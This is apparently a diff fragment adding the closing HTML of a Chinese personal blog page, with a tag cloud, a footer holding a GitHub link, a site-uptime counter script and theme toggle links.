+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;" class="tags-cloud-0">协议</a> <a href="/tags/%E5%9B%9E%E9%A1%BE/" style="font-size: 10px;" class="tags-cloud-0">回顾</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;" class="tags-cloud-0">工具</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 10px;" class="tags-cloud-0">技术</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size: 20px;" class="tags-cloud-10">杂谈</a> <a href="/tags/%E7%BD%91%E9%A1%B5/" style="font-size: 10px;" class="tags-cloud-0">网页</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+      <div class="social-icons">
+        
+          
+              
+          
+              
+          
+              
+          
+            <a href="https://github.com/CoreYunFeng/" class="soft-size--primary soft-style--box" target="_blank"
+              rel="noopener noreferrer">
+              <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+            </a>
+            
+              
+          
+              
+      </div>
+      
+        <p>&copy; 2024 <a href="/" target="_blank">
+              CoreYun
+            </a></p>
+
+        
+
+            <div>
+              <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+              <script>
+                var now = new Date();
+                function createtime() {
+                  var webCreatetime = new Date("2024/01/29 09:30:00");
+                  now.setTime(now.getTime() + 250);
+                  days = (now - webCreatetime) / 1000 / 60 / 60 / 24;
+                  dayNum = Math.floor(days);
+                  hours = (now - webCreatetime) / 1000 / 60 / 60 - (24 * dayNum);
+                  hourNum = Math.floor(hours);
+                  if (String(hourNum).length == 1) { hourNum = "0" + hourNum; }
+                  minutes = (now - webCreatetime) / 1000 / 60 - (24 * 60 * dayNum) - (60 * hourNum);
+                  monthNum = Math.floor(minutes);
+                  if (String(monthNum).length == 1) { monthNum = "0" + monthNum; }
+                  seconds = (now - webCreatetime) / 1000 - (24 * 60 * 60 * dayNum) - (60 * 60 * hourNum) - (60 * monthNum);
+                  snum = Math.round(seconds);
+                  if (String(snum).length == 1) { snum = "0" + snum; }
+                  document.getElementById("timeDate").innerHTML = "我们已运行 " + dayNum + " 天 ";
+                  document.getElementById("times").innerHTML = hourNum + " 小时 " + monthNum + " 分 " + snum + " 秒";
+                }
+                setInterval("createtime()", 250);
+              </script>
+            </div>
+
+            <p>本博客版权归属云枫所有</p>
+
+            <span class="post-count">
+              本站博客共10702字
+            </span>
+
+            <p>
+              <a href="javascript:;" id="theme-light">🌞 浅色</a>
+              <a href="javascript:;" id="theme-dark">🌛 深色</a>
+              <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+            </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
